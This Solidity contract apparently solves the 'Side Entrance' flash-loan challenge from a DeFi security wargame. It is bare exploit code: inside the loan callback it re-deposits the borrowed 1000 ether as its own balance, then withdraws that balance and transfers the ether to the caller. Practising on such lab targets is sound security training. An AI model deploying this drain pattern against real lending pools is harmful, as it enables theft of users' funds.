// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";

interface SideEntranceLenderPoolInterface {
	function flashLoan(uint256 amount) external;
	function deposit() external payable;
	function withdraw() external;
}

contract CustomSideEntrance {
	
    using Address for address payable;

    address payable private pool;
	
    SideEntranceLenderPoolInterface public pool_contract;

    constructor(address payable poolAddress) {
        pool_contract = SideEntranceLenderPoolInterface(poolAddress);
    }
	
    // Function called by the pool during flash loan
    function execute() external payable {
		
		pool_contract.deposit{value: 1000 ether}();
		
    }
	
	function attack() external {
		
        pool_contract.flashLoan(1000 ether);
        pool_contract.withdraw();

        payable(msg.sender).transfer(1000 ether);
		
    }

    receive () external payable {}
	
}